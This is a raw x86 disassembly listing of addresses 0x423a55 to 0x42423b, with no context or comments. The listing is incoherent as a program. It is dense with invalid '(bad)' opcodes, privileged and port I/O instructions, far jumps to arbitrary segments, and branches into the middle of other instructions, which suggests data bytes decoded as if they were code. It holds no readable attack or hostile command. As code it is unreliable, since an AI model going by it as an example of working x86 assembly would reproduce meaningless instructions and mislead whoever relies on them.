  423a55:	xlat   BYTE PTR ds:[ebx]
  423a56:	dec    eax
  423a57:	js     0x423a42
  423a59:	mov    esp,0xf9d9c8aa
  423a5e:	loopne 0x423add
  423a60:	ins    BYTE PTR es:[edi],dx
  423a61:	fwait
  423a62:	das    
  423a63:	stc    
  423a64:	cwde   
  423a65:	jae    0x423a67
  423a67:	jnp    0x423ae7
  423a69:	in     eax,0x58
  423a6b:	xchg   DWORD PTR [ecx],ebp
  423a6d:	aaa    
  423a6e:	and    edx,ebx
  423a70:	retf   0xa1e0
  423a73:	test   al,0x3
  423a75:	or     BYTE PTR [eax],ch
  423a77:	mov    eax,0x7214412d
  423a7c:	jmp    0x8c1d:0x8decebd9
  423a83:	adc    BYTE PTR [edx-0x73380a39],ch
  423a89:	and    al,0xf1
  423a8b:	out    dx,al
  423a8c:	cmp    DWORD PTR [esi+0x24],0xd89eebb1
  423a93:	bound  esi,QWORD PTR [edi+0x9670647]
  423a99:	(bad)  
  423a9b:	aaa    
  423a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a9d:	call   0x9dfd:0xd761356
  423aa4:	daa    
  423aa5:	clc    
  423aa6:	or     BYTE PTR [eax-0x20],bl
  423aa9:	mov    ch,0x89
  423aab:	enter  0xd4e1,0x81
  423aaf:	and    ecx,DWORD PTR [edx-0x5d74f99f]
  423ab5:	test   esp,edi
  423ab7:	jbe    0x423b2b
  423ab9:	pop    edx
  423aba:	fldcw  WORD PTR [esi+0x7c6d5c36]
  423ac0:	mov    al,ds:0xeac750bd
  423ac5:	je     0x423ae4
  423ac7:	mov    edx,0x59bdef36
  423acc:	push   es
  423acd:	repnz cld 
  423acf:	sbb    esp,ebp
  423ad1:	icebp  
  423ad2:	inc    eax
  423ad3:	jmp    0x6f4e:0xc855d22b
  423ada:	add    al,0x1a
  423adc:	cmp    edi,DWORD PTR [ecx-0x37144930]
  423ae2:	gs out dx,al
  423ae4:	call   0x3cc8af45
  423ae9:	fist   WORD PTR [ebx-0x5bf6434b]
  423aef:	jmp    0x423ae3
  423af1:	mov    ah,0xa0
  423af3:	call   0xf00:0x48b872df
  423afa:	stos   DWORD PTR es:[edi],eax
  423afb:	pop    edi
  423afc:	dec    esp
  423afd:	ins    BYTE PTR es:[edi],dx
  423afe:	mul    al
  423b00:	dec    ebx
  423b01:	sbb    bh,BYTE PTR [ebp+0x50]
  423b04:	xor    DWORD PTR [edx-0x4b269def],ecx
  423b0a:	out    0x93,eax
  423b0c:	push   0xd7f9a1df
  423b11:	pop    eax
  423b12:	pop    eax
  423b13:	sub    BYTE PTR [ebx-0x1bcb5021],bh
  423b19:	sub    BYTE PTR [edi+0xc],ch
  423b1c:	adc    DWORD PTR [edx-0x25],esi
  423b1f:	cwde   
  423b20:	out    0x8c,al
  423b22:	std    
  423b23:	scas   eax,DWORD PTR es:[edi]
  423b24:	lea    ebx,[edi]
  423b26:	mov    BYTE PTR [eax+0x46],bh
  423b29:	fild   QWORD PTR [esi]
  423b2b:	jecxz  0x423b91
  423b2d:	jnp    0x423b7b
  423b2f:	and    DWORD PTR [ecx+0x6f78e452],eax
  423b35:	xchg   DWORD PTR [esi+0x47],edi
  423b38:	cs mov edx,0xc54bc306
  423b3e:	(bad)  
  423b3f:	imul   esi,DWORD PTR [edx],0x250833e0
  423b45:	(bad)  [esi+0x6dda9388]
  423b4b:	sti    
  423b4c:	jmp    0x423af0
  423b4e:	push   esi
  423b4f:	jecxz  0x423af6
  423b51:	jle    0x423bb6
  423b53:	add    DWORD PTR [ebx+edx*2],ebx
  423b56:	ret    
  423b57:	enter  0x3a4d,0x43
  423b5b:	mov    al,0x9
  423b5d:	jno    0x423b08
  423b5f:	xchg   edx,eax
  423b60:	jmp    0xa35a0722
  423b65:	js     0x423b2e
  423b67:	mov    BYTE PTR [eax+0x31],al
  423b6a:	mov    ebp,cr2
  423b6d:	fdivr  QWORD PTR [ebp+edx*1-0x67552828]
  423b74:	cmp    ecx,DWORD PTR [edi-0x29]
  423b77:	(bad)  
  423b78:	adc    DWORD PTR [edx],esp
  423b7a:	std    
  423b7b:	mov    ds,WORD PTR [esi]
  423b7d:	jbe    0x423b73
  423b7f:	gs ja  0x423b2b
  423b82:	add    al,bh
  423b84:	mov    ah,0x2d
  423b86:	pop    ds
  423b87:	std    
  423b88:	mov    ecx,0xca83ca4f
  423b8d:	xor    al,0xfd
  423b8f:	loope  0x423b6d
  423b91:	or     dl,ch
  423b93:	setl   BYTE PTR [eax]
  423b96:	ins    BYTE PTR es:[edi],dx
  423b97:	enter  0xb5de,0xe4
  423b9b:	ins    BYTE PTR es:[edi],dx
  423b9c:	mov    bh,0x76
  423b9e:	dec    edx
  423b9f:	por    mm0,QWORD PTR [eax-0x5f]
  423ba3:	xchg   DWORD PTR [ebp-0x4600773a],esp
  423ba9:	in     eax,dx
  423baa:	sub    ecx,DWORD PTR [edi+0x23]
  423bad:	fadd   st(4),st
  423baf:	jae    0x423c2b
  423bb1:	add    BYTE PTR [ebp-0x3d3c8fe],bl
  423bb7:	retf   
  423bb8:	outs   dx,DWORD PTR ds:[esi]
  423bb9:	dec    esp
  423bba:	push   esp
  423bbb:	mov    dh,0x5d
  423bbd:	imul   edi,ebp,0x57
  423bc0:	fsubr  DWORD PTR [ebp+0x25]
  423bc3:	push   0xd9dcdfaf
  423bc8:	int3   
  423bc9:	shl    DWORD PTR [edx-0x26f2a8e],0x2
  423bd0:	loope  0x423b61
  423bd2:	push   DWORD PTR [esi+ebp*1]
  423bd5:	or     ah,bl
  423bd7:	(bad)  
  423bd8:	cld    
  423bd9:	pushf  
  423bda:	push   es
  423bdb:	sbb    edx,DWORD PTR [edx-0x16]
  423bde:	xor    eax,0xc139ea09
  423be3:	dec    ebx
  423be4:	(bad)  
  423be5:	push   eax
  423be6:	and    esi,DWORD PTR [eax]
  423be8:	test   BYTE PTR [edi-0x6b944a00],ah
  423bee:	dec    esp
  423bef:	enter  0xb39c,0x5b
  423bf3:	pop    ds
  423bf4:	jmp    0x44e22fdc
  423bf9:	in     al,dx
  423bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bfb:	test   DWORD PTR [esi-0x5275429c],eax
  423c01:	jnp    0x423b96
  423c03:	(bad)  
  423c04:	xor    ebp,DWORD PTR [ebx+0x62]
  423c07:	jmp    0x423c52
  423c09:	fsub   QWORD PTR [ebp+edx*4-0x42d1e58d]
  423c10:	fiadd  DWORD PTR [ebp+esi*8-0x5f2653e9]
  423c17:	mov    al,0x85
  423c19:	push   eax
  423c1a:	std    
  423c1b:	xor    bh,dh
  423c1d:	cmp    eax,0x30eb091d
  423c22:	mov    ah,0x7d
  423c24:	dec    esi
  423c25:	pop    esp
  423c26:	mov    ch,0x8b
  423c28:	ret    
  423c29:	jg     0x423bb4
  423c2b:	dec    ebp
  423c2c:	sub    bh,bl
  423c2e:	fist   WORD PTR [edi]
  423c30:	imul   edi,ebx,0x79
  423c33:	or     ebp,edi
  423c35:	loop   0x423c33
  423c37:	sub    BYTE PTR [ebp-0x644dba5f],dl
  423c3d:	cmp    al,0x29
  423c3f:	iret   
  423c40:	punpcklwd mm4,DWORD PTR [esi]
  423c43:	pop    ss
  423c44:	retf   
  423c45:	test   DWORD PTR [edx],0xfd878ef3
  423c4b:	retf   0xcb0
  423c4e:	outs   dx,BYTE PTR ds:[esi]
  423c4f:	loop   0x423bdc
  423c51:	loope  0x423ca1
  423c53:	enter  0xa523,0x3a
  423c57:	out    0xf9,al
  423c59:	(bad)  
  423c5a:	sub    dh,BYTE PTR [edi-0x15]
  423c5d:	sahf   
  423c5e:	sti    
  423c5f:	sub    al,0x2d
  423c61:	test   eax,0xdefb583b
  423c66:	jmp    FWORD PTR [eax+0x7f]
  423c69:	loop   0x423c06
  423c6b:	gs dec edx
  423c6d:	pop    ds
  423c6e:	jno    0x423bfa
  423c70:	jmp    0x423cd0
  423c72:	mov    WORD PTR [edx-0x59],?
  423c75:	jnp    0x423c96
  423c77:	(bad)  
  423c78:	xchg   edx,eax
  423c79:	fist   WORD PTR [esi+0x5720553d]
  423c7f:	lds    esp,FWORD PTR [edi-0x50]
  423c82:	cld    
  423c83:	addr16 cmp al,0x14
  423c86:	cmp    eax,DWORD PTR [eax-0x2c5a1bdf]
  423c8c:	into   
  423c8d:	shr    ebp,0xc3
  423c90:	jmp    0x423c1d
  423c92:	inc    ecx
  423c93:	push   ebp
  423c94:	adc    BYTE PTR [ebx],0x2a
  423c97:	xor    ebp,esp
  423c99:	mov    ds:0x7ff587f4,al
  423c9e:	push   ds
  423c9f:	xor    BYTE PTR [ebx+0x4dc7e3b0],bl
  423ca5:	retf   0x2120
  423ca8:	mov    esp,0xebff3acc
  423cad:	push   eax
  423cae:	dec    edx
  423caf:	jmp    0xe007:0x3c32ecd7
  423cb6:	or     ch,ch
  423cb8:	push   eax
  423cb9:	in     al,0x22
  423cbb:	test   al,0x69
  423cbd:	push   0xffffff84
  423cbf:	ja     0x423cac
  423cc1:	daa    
  423cc2:	mov    ecx,0x5e253bc0
  423cc7:	mov    BYTE PTR [eax],bh
  423cc9:	ffreep st(5)
  423ccb:	test   bh,0x0
  423cce:	or     ah,BYTE PTR [edx-0x1]
  423cd1:	fdivr  st,st(7)
  423cd3:	pusha  
  423cd4:	mov    edx,0x29dc2810
  423cd9:	pop    ss
  423cda:	mov    dh,0x7a
  423cdc:	inc    ebp
  423cdd:	fistp  WORD PTR [edx+edx*1+0x4c]
  423ce1:	jecxz  0x423cf9
  423ce3:	daa    
  423ce4:	mov    esp,0x68dafcce
  423ce9:	mov    dh,0x4a
  423ceb:	mov    ah,0xb1
  423ced:	xchg   ebx,eax
  423cee:	fadd   st(7),st
  423cf0:	test   DWORD PTR [ecx+0x233a5193],edx
  423cf6:	push   esi
  423cf7:	shr    ebx,cl
  423cf9:	aas    
  423cfa:	push   cs
  423cfb:	and    DWORD PTR [ecx+0x79],0x61
  423cff:	pop    edi
  423d00:	sub    BYTE PTR [ebx+0x61eb3ea8],bl
  423d06:	ss dec eax
  423d09:	jp     0x423d0c
  423d0b:	retf   
  423d0c:	jmp    0xe6c2:0x6452b8fe
  423d13:	call   DWORD PTR [ebx+0x79ba60a4]
  423d19:	xor    eax,0x8217c810
  423d1e:	aaa    
  423d1f:	cmp    al,0x50
  423d21:	ss std 
  423d23:	outs   dx,DWORD PTR ds:[esi]
  423d24:	cmp    eax,eax
  423d26:	sub    esp,ecx
  423d28:	lods   al,BYTE PTR ds:[esi]
  423d29:	pop    edx
  423d2a:	pop    ecx
  423d2b:	leave  
  423d2c:	xchg   ebp,ebp
  423d2e:	mov    bl,0x5b
  423d30:	sti    
  423d31:	in     al,0xd5
  423d33:	or     ebp,DWORD PTR [edi+0x52]
  423d36:	jmp    DWORD PTR [edi]
  423d38:	xor    eax,0xfef57e20
  423d3d:	pop    ds
  423d3e:	repz and BYTE PTR [esi-0x21],al
  423d42:	pop    ds
  423d43:	xor    esp,esp
  423d45:	jl     0x423d71
  423d47:	cmp    dl,BYTE PTR [ebx-0x15b20358]
  423d4d:	cmp    eax,0x691f0ff0
  423d52:	dec    esp
  423d53:	mov    esi,0x4b71940a
  423d58:	cwde   
  423d59:	inc    edi
  423d5a:	dec    ebx
  423d5b:	shl    DWORD PTR [ebx],0x93
  423d5e:	scas   al,BYTE PTR es:[edi]
  423d5f:	inc    edi
  423d60:	jmp    0x423d42
  423d62:	mov    ch,0xf1
  423d64:	repz sub eax,0xdf325e5f
  423d6a:	xor    al,0x34
  423d6c:	ins    DWORD PTR es:[edi],dx
  423d6d:	push   ds
  423d6e:	push   ebp
  423d6f:	test   eax,0x760490b7
  423d74:	dec    ebx
  423d75:	(bad)  
  423d77:	icebp  
  423d78:	sar    BYTE PTR [ebp+edx*4+0x3b],1
  423d7c:	mov    dl,dh
  423d7e:	cmp    DWORD PTR [esi-0x59],ecx
  423d81:	xchg   ecx,eax
  423d82:	std    
  423d83:	jnp    0x423dd8
  423d85:	adc    ebx,DWORD PTR [ebx+0x1030eb31]
  423d8b:	in     al,0xb2
  423d8d:	and    esp,edx
  423d8f:	iret   
  423d90:	out    0xdf,eax
  423d92:	jge    0x423d2b
  423d94:	rdtsc  
  423d96:	lods   al,BYTE PTR ds:[esi]
  423d97:	pop    ebp
  423d98:	push   esp
  423d99:	mov    bh,0xfc
  423d9b:	enter  0x1471,0xa0
  423d9f:	mov    ebp,0xc803cf0d
  423da4:	popa   
  423da5:	dec    edx
  423da6:	or     eax,ecx
  423da8:	adc    BYTE PTR [esi],bh
  423daa:	sbb    BYTE PTR [ecx-0x292b9f12],cl
  423db0:	jae    0x423df1
  423db2:	scas   al,BYTE PTR es:[edi]
  423db3:	icebp  
  423db4:	stos   BYTE PTR es:[edi],al
  423db5:	add    al,0xaa
  423db7:	mov    esi,0x4824e16c
  423dbc:	jnp    0x423d7e
  423dbe:	gs scas al,BYTE PTR es:[edi]
  423dc0:	xchg   edx,eax
  423dc1:	inc    eax
  423dc2:	std    
  423dc3:	jmp    0xf87a:0xd39cc4a6
  423dca:	out    0xc7,al
  423dcc:	aad    0xa5
  423dce:	icebp  
  423dcf:	call   0xe0146cfa
  423dd4:	or     DWORD PTR [esi],ebx
  423dd6:	movntq (bad),mm3
  423dd7:	out    0xdf,eax
  423dd9:	jns    0x423dd8
  423ddb:	mov    cs,WORD PTR [edx]
  423ddd:	pop    edi
  423dde:	jnp    0x423dd6
  423de0:	sbb    eax,0xfffffff3
  423de3:	mov    ah,0x1b
  423de5:	in     al,0x9c
  423de7:	cmc    
  423de8:	es inc edx
  423dea:	dec    esp
  423deb:	jns    0x423dec
  423ded:	cmc    
  423dee:	(bad)  
  423def:	mov    esi,0x8b0cd36b
  423df4:	sbb    DWORD PTR [ebp-0x19],0xffffff95
  423df8:	mov    eax,0x1cc5b8df
  423dfd:	pop    ebx
  423dfe:	mov    esp,0xfd5511e4
  423e03:	out    dx,al
  423e04:	dec    ecx
  423e05:	pushf  
  423e06:	int    0x7d
  423e08:	addr16 das 
  423e0a:	mov    eax,0x97e982be
  423e0f:	enter  0x8747,0xb1
  423e13:	cmp    dh,BYTE PTR [ecx+0x57]
  423e16:	in     eax,0x4c
  423e18:	cmp    eax,0xf379f9cd
  423e1d:	pop    ecx
  423e1e:	sbb    esi,DWORD PTR [eax+0x66]
  423e21:	pop    es
  423e22:	ins    DWORD PTR es:[edi],dx
  423e23:	lds    edx,FWORD PTR [edx+ebp*2+0x6278c869]
  423e2a:	ret    0x2a7d
  423e2d:	xor    BYTE PTR [edi],al
  423e2f:	and    al,0xa2
  423e31:	add    eax,0x8f23e5fd
  423e36:	ret    
  423e37:	add    bl,BYTE PTR [edi]
  423e39:	outs   dx,BYTE PTR ds:[esi]
  423e3a:	sbb    al,0xc9
  423e3c:	cmp    dh,BYTE PTR [edi-0x6b8af956]
  423e42:	cmp    DWORD PTR ds:0xa35a53db,ebx
  423e48:	jmp    0x423dfe
  423e4a:	div    ecx
  423e4c:	cld    
  423e4d:	jae    0x423e31
  423e4f:	daa    
  423e50:	jbe    0x423e32
  423e52:	loopne 0x423eb1
  423e54:	test   eax,0xd8d7d369
  423e59:	dec    ecx
  423e5a:	in     al,0xbd
  423e5c:	jmp    0x423ec8
  423e5e:	test   edi,0x82bdd0a8
  423e64:	jb     0x423e45
  423e66:	call   0x39c2ae17
  423e6b:	pushf  
  423e6c:	cmp    DWORD PTR [eax],esp
  423e6e:	std    
  423e6f:	out    dx,al
  423e70:	stos   BYTE PTR es:[edi],al
  423e71:	lods   al,BYTE PTR ds:[esi]
  423e72:	pop    es
  423e73:	cmp    al,0x2f
  423e75:	fs sub al,bh
  423e78:	test   eax,0xf9c3f206
  423e7d:	out    dx,eax
  423e7e:	pop    ecx
  423e7f:	out    dx,al
  423e80:	or     BYTE PTR [eax-0x7fe4ee03],dl
  423e86:	loop   0x423ea9
  423e88:	sbb    dl,BYTE PTR [ecx]
  423e8a:	clc    
  423e8b:	(bad)  
  423e8c:	cmp    DWORD PTR [ecx+edx*4+0x6],eax
  423e90:	jns    0x423ec0
  423e92:	xchg   edi,eax
  423e93:	imul   bl
  423e95:	cmp    DWORD PTR [esi-0x18c03aae],eax
  423e9b:	sbb    DWORD PTR [ecx+0x429e81ca],ebp
  423ea1:	fbstp  TBYTE PTR [edx+0x2cd647f2]
  423ea7:	daa    
  423ea8:	lods   eax,DWORD PTR ds:[esi]
  423ea9:	jbe    0x423ea8
  423eab:	in     al,dx
  423eac:	jle    0x423f1f
  423eae:	fdiv   DWORD PTR [ebp-0x378a2a37]
  423eb4:	sar    ecx,cl
  423eb6:	in     eax,0xa4
  423eb8:	ins    DWORD PTR es:[edi],dx
  423eb9:	call   0x4a2cc43a
  423ebe:	lea    esp,[esi]
  423ec0:	dec    eax
  423ec1:	push   edx
  423ec2:	jg     0x423f14
  423ec4:	enter  0xba4b,0xcb
  423ec8:	jae    0x423e6f
  423eca:	xchg   esi,eax
  423ecb:	scas   eax,DWORD PTR es:[edi]
  423ecc:	aad    0xc8
  423ece:	push   ebx
  423ecf:	or     BYTE PTR [ebp-0x3],ah
  423ed2:	xchg   esp,eax
  423ed3:	sbb    bl,ch
  423ed5:	adc    eax,0x33326844
  423eda:	loop   0x423f4c
  423edc:	and    eax,0x8ed878df
  423ee1:	mov    eax,ds:0x806175e4
  423ee6:	cld    
  423ee7:	js     0x423e6b
  423ee9:	cmp    ch,BYTE PTR [eax-0x1f30e410]
  423eef:	add    ah,ah
  423ef1:	fist   WORD PTR [edx+0x31]
  423ef4:	inc    eax
  423ef5:	push   ss
  423ef6:	iret   
  423ef7:	pop    esp
  423ef8:	outs   dx,BYTE PTR fs:[esi]
  423efa:	std    
  423efb:	not    ch
  423efd:	aad    0xe8
  423eff:	retf   0x649e
  423f02:	jmp    0x520b:0xfd03dddc
  423f09:	nop    DWORD PTR [edx-0x43]
  423f0d:	push   ecx
  423f0e:	std    
  423f0f:	xchg   ebx,eax
  423f10:	sub    ecx,DWORD PTR [ebp+ebx*4-0x7d373aab]
  423f17:	enter  0x5262,0xc4
  423f1b:	mov    bl,0x2c
  423f1d:	int3   
  423f1e:	lea    eax,[esi-0x15]
  423f21:	dec    edi
  423f22:	cwde   
  423f23:	xchg   ebp,eax
  423f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f25:	js     0x423f97
  423f27:	in     al,0x48
  423f29:	fild   QWORD PTR [eax-0x7cfef6b9]
  423f2f:	mov    eax,ds:0x69fd8e00
  423f34:	xchg   DWORD PTR [edx-0x67],ebp
  423f37:	pop    ecx
  423f38:	test   BYTE PTR [eax+0x5d],bh
  423f3b:	lahf   
  423f3c:	sub    eax,0x76c8c651
  423f41:	mov    edx,0xd9a247ab
  423f46:	scas   al,BYTE PTR es:[edi]
  423f47:	xchg   DWORD PTR [eax],eax
  423f49:	aas    
  423f4a:	or     DWORD PTR [edi+0x31cfefea],0xffffffe3
  423f51:	sub    BYTE PTR [ebp-0x14a9a0f2],cl
  423f57:	(bad)  
  423f58:	ins    DWORD PTR es:[edi],dx
  423f59:	mov    ch,0x18
  423f5b:	aas    
  423f5c:	xchg   edx,eax
  423f5d:	nop
  423f5e:	xor    al,0x58
  423f60:	or     eax,0xeb0642fd
  423f65:	sbb    BYTE PTR [ebx+0x43ad223],cl
  423f6b:	mov    bh,0x3a
  423f6d:	ficom  WORD PTR [edx]
  423f6f:	push   esp
  423f70:	xchg   edx,eax
  423f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f72:	mov    BYTE PTR [edx],ah
  423f74:	popf   
  423f75:	pop    ds
  423f76:	pushf  
  423f77:	add    BYTE PTR [ebx+0x3f93fbf9],al
  423f7d:	inc    esi
  423f7e:	enter  0xeb67,0xac
  423f82:	push   0xf7df5c4e
  423f87:	out    0xfe,al
  423f89:	fs mov dl,0x28
  423f8c:	jno    0x423fcb
  423f8e:	std    
  423f8f:	mov    WORD PTR [ecx-0x19eaaedb],es
  423f95:	xor    al,BYTE PTR [ecx]
  423f97:	enter  0xfcda,0x34
  423f9b:	cli    
  423f9c:	test   al,0xbe
  423f9e:	jbe    0x423fe1
  423fa0:	jmp    0x5212:0x65dd29c4
  423fa7:	xor    BYTE PTR [ebp-0x683436c4],cl
  423fad:	cli    
  423fae:	sub    al,0xcf
  423fb0:	pushf  
  423fb1:	mov    dh,BYTE PTR [ebp-0x2d98099]
  423fb7:	out    dx,eax
  423fb8:	adc    BYTE PTR [ebx+0x5a8ff257],al
  423fbe:	pop    ebx
  423fbf:	(bad)  
  423fc0:	pop    ds
  423fc1:	aam    0x11
  423fc3:	sbb    ecx,eax
  423fc5:	aas    
  423fc6:	outs   dx,DWORD PTR ds:[esi]
  423fc7:	xlat   BYTE PTR ds:[ebx]
  423fc9:	sub    al,0xa3
  423fcb:	dec    eax
  423fcc:	jmp    0x424027
  423fce:	push   esi
  423fcf:	mov    ah,dh
  423fd1:	jb     0x423f74
  423fd3:	out    0xa4,al
  423fd5:	loopne 0x424030
  423fd7:	and    DWORD PTR [esi+0x17],edi
  423fda:	pop    ss
  423fdb:	test   al,0x92
  423fdd:	and    cl,BYTE PTR [edi+ecx*8+0x7b]
  423fe1:	fs add esi,esi
  423fe4:	popf   
  423fe5:	cmp    BYTE PTR [edi+eiz*4],dh
  423fe8:	lock jg 0x423fc4
  423feb:	cmp    ebp,DWORD PTR [edi-0x3373849]
  423ff1:	jle    0x423fdb
  423ff3:	jg     0x423fc6
  423ff5:	xlat   BYTE PTR ds:[ebx]
  423ff6:	sbb    BYTE PTR [esi-0x15],al
  423ff9:	cmp    al,0x82
  423ffb:	pop    ecx
  423ffc:	(bad)  
  423ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ffe:	inc    ecx
  423fff:	fisttp WORD PTR [esi-0x21]
  424002:	ds sub eax,0xfaa306b2
  424008:	push   0xae5cfcca
  42400d:	or     al,bl
  42400f:	ds loope 0x423f93
  424012:	mov    BYTE PTR [esi+0x3200df44],bl
  424018:	inc    ebx
  424019:	push   esp
  42401a:	add    BYTE PTR [edx+0x45e55779],bl
  424020:	pandn  mm7,QWORD PTR [ebx]
  424023:	call   FWORD PTR [edi]
  424025:	ds sbb eax,0x7105248c
  42402b:	add    ebp,DWORD PTR [ebx+0x26]
  42402e:	stos   BYTE PTR es:[edi],al
  42402f:	xor    DWORD PTR [ecx],esp
  424031:	xchg   esp,eax
  424032:	neg    BYTE PTR [edi-0x305c5e15]
  424038:	xor    esi,DWORD PTR [edx]
  42403a:	fild   WORD PTR [ebx+eiz*1-0x24]
  42403e:	retf   
  42403f:	bound  edx,QWORD PTR [ebp+0x734fa30b]
  424045:	jbe    0x424086
  424047:	mov    ecx,0x3ffce905
  42404c:	inc    esi
  42404d:	adc    eax,0x6159a37f
  424052:	xor    eax,0x3d831ec8
  424057:	jge    0x4240bc
  424059:	mov    al,ds:0x79eb597c
  42405e:	stos   DWORD PTR es:[edi],eax
  42405f:	jno    0x424057
  424061:	lea    edi,[bp+si-0x2080]
  424066:	(bad)
  424069:	ja     0x4240bb
  42406b:	sbb    ch,dl
  42406d:	mov    dl,0xff
  42406f:	mov    esi,eax
  424071:	loop   0x424029
  424073:	sub    eax,0x35631f3a
  424078:	out    0xde,eax
  42407a:	shl    BYTE PTR [esi-0x61],1
  42407d:	add    eax,0xf32f1df
  424082:	sbb    edx,ecx
  424084:	jmp    0x4240a2
  424086:	mov    bh,0xb6
  424088:	shufps xmm2,XMMWORD PTR [eax+0x3],0x5f
  42408d:	fbstp  TBYTE PTR [ecx+0x34650298]
  424093:	pop    eax
  424094:	ret    
  424095:	mov    esi,0x7e1c1dfc
  42409a:	icebp  
  42409b:	cmp    BYTE PTR [eax+0x71],ah
  42409e:	(bad)
  4240a2:	bnd je 0x4240d7
  4240a5:	into   
  4240a6:	mov    ebp,0x5b3feba2
  4240ab:	cwde   
  4240ac:	repz or bl,dh
  4240af:	inc    DWORD PTR [eax+0x756d02e2]
  4240b5:	adc    eax,0x80cb07f4
  4240ba:	jle    0x424108
  4240bc:	jmp    0x42404a
  4240be:	pop    ecx
  4240bf:	push   cs
  4240c0:	icebp  
  4240c1:	xchg   BYTE PTR [edx-0x22],dh
  4240c4:	push   edx
  4240c5:	loopne 0x4240c7
  4240c7:	mov    ch,0xc8
  4240c9:	aaa    
  4240ca:	sbb    bl,BYTE PTR [eax-0x6cde788d]
  4240d0:	out    dx,al
  4240d1:	icebp  
  4240d2:	out    dx,al
  4240d3:	(bad)  
  4240d4:	neg    DWORD PTR [edi+0x73]
  4240d7:	jae    0x424130
  4240d9:	sahf   
  4240da:	hlt    
  4240db:	enter  0xc401,0xdf
  4240df:	and    ecx,ebx
  4240e1:	fld    QWORD PTR [esi+0x10]
  4240e4:	mov    DWORD PTR [edi+0x373edcfc],edx
  4240ea:	iret   
  4240eb:	and    eax,0xc8caba26
  4240f0:	lods   eax,DWORD PTR ds:[esi]
  4240f1:	loope  0x4240fb
  4240f3:	lahf   
  4240f4:	sbb    DWORD PTR [esi+0x6c],edx
  4240f7:	pop    ds
  4240f8:	jmp    0x4240af
  4240fa:	das    
  4240fb:	xor    eax,0x38807b51
  424100:	and    ebx,edi
  424102:	add    bl,cl
  424104:	ret    
  424105:	dec    ecx
  424106:	jmp    0x8b68:0xd4d94df4
  42410d:	mov    ebp,edi
  42410f:	pop    esi
  424110:	push   eax
  424111:	inc    ebx
  424112:	mov    ah,0xfb
  424114:	test   eax,0x85bfb68c
  424119:	mov    ebp,eax
  42411b:	dec    eax
  42411c:	nop
  42411d:	pop    edx
  42411e:	adc    BYTE PTR ds:0xa6feefa5,ah
  424124:	ins    BYTE PTR es:[edi],dx
  424125:	jl     0x4240e2
  424127:	iret   
  424128:	in     eax,0x5f
  42412a:	mov    ds:0xf2cbe9b3,eax
  42412f:	enter  0xd153,0xc2
  424133:	ss mov cs,eax
  424136:	popa   
  424137:	and    al,dh
  424139:	cmp    ebp,0x781d7e82
  42413f:	test   DWORD PTR [eax+edi*8-0xdb83790],edi
  424146:	mov    cl,BYTE PTR [ecx+0x40]
  424149:	jbe    0x424177
  42414b:	cmp    ebp,ebx
  42414d:	lahf   
  42414e:	loop   0x424141
  424150:	out    dx,al
  424151:	aad    0x4e
  424153:	retf   0xdf5b
  424156:	sbb    al,0x3a
  424158:	shr    esp,0xff
  42415b:	dec    ebx
  42415c:	adc    BYTE PTR [edi+0x271b53fd],al
  424162:	fmul   DWORD PTR [ecx+0x73]
  424165:	mov    ebx,0x5517c7e9
  42416a:	unpckhps xmm2,XMMWORD PTR [ebx]
  42416d:	add    al,0xa8
  42416f:	mov    cl,0xeb
  424171:	push   esp
  424172:	loopne 0x4241a0
  424174:	jnp    0x424162
  424176:	dec    esi
  424177:	scas   eax,DWORD PTR es:[edi]
  424178:	add    bh,dl
  42417a:	or     ebp,DWORD PTR [eax+0x50fc9417]
  424180:	test   DWORD PTR [eax-0x80],ecx
  424183:	shr    ebx,cl
  424185:	or     dl,BYTE PTR [eax+0x62]
  424188:	stos   DWORD PTR es:[edi],eax
  424189:	sbb    ebx,DWORD PTR [esp+ebp*1+0x6830e849]
  424190:	or     BYTE PTR [edx+edi*1-0x2b],bl
  424194:	int    0x8c
  424196:	je     0x4241d0
  424198:	stos   BYTE PTR es:[edi],al
  424199:	mov    eax,ds:0xd8eb5aa2
  42419e:	in     eax,dx
  42419f:	jbe    0x424203
  4241a1:	and    al,0x62
  4241a3:	adc    eax,0xee5ee06b
  4241a8:	(bad)  
  4241a9:	shl    al,1
  4241ab:	xchg   eax,edx
  4241ad:	int    0x18
  4241af:	mov    cl,0xeb
  4241b1:	sub    ah,BYTE PTR [ecx]
  4241b3:	xchg   edx,eax
  4241b4:	out    0x8b,al
  4241b6:	mov    ds:0x8bdfa7d2,al
  4241bb:	iret   
  4241bc:	dec    esp
  4241bd:	adc    eax,0x765ece1c
  4241c2:	std    
  4241c3:	push   ds
  4241c4:	and    al,0x6e
  4241c6:	fldenv [esi-0x51]
  4241c9:	dec    ebx
  4241ca:	stos   DWORD PTR es:[edi],eax
  4241cb:	push   ds
  4241cc:	add    esp,eax
  4241ce:	into   
  4241cf:	sub    eax,0xeceb89cb
  4241d4:	fcom   QWORD PTR [edx]
  4241d6:	(bad)  
  4241d7:	loopne 0x42418a
  4241d9:	mov    ds:0x764104fa,al
  4241de:	lds    esp,FWORD PTR [edx-0x5337f61e]
  4241e4:	out    0xf1,al
  4241e6:	rcr    BYTE PTR [ebp-0xbdbd0e9],1
  4241ec:	xchg   esp,eax
  4241ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241ee:	cld    
  4241ef:	push   eax
  4241f0:	xor    al,dh
  4241f2:	jae    0x424269
  4241f4:	push   ecx
  4241f5:	mov    ds,WORD PTR [ecx+0x4b72ad8]
  4241fb:	lds    ebx,FWORD PTR [ebp-0x450c1e2c]
  424201:	(bad)  
  424203:	mov    ah,0xbe
  424205:	(bad)  
  424206:	xlat   BYTE PTR ds:[ebx]
  424207:	sub    al,0x8f
  424209:	cmp    eax,0x3e39c587
  42420e:	fmul   QWORD PTR [edi-0x74]
  424211:	fistp  WORD PTR [ecx-0x4e836eb8]
  424217:	pop    esi
  424218:	jmp    0x4241e9
  42421a:	call   0xc3c6:0x90c714d2
  424221:	fsubr  st,st(4)
  424223:	mov    eax,0xfdcfa58
  424228:	aas    
  424229:	inc    ebp
  42422a:	retf   
  42422b:	mov    ebx,0xf1771beb
  424230:	mov    al,0x5c
  424232:	shr    bl,1
  424234:	ja     0x424215
  424236:	and    DWORD PTR [ecx+0x7d],eax
  424239:	stos   DWORD PTR es:[edi],eax
  42423a:	push   edx
  42423b:	mov    al,ds:0x6bfd2f7f
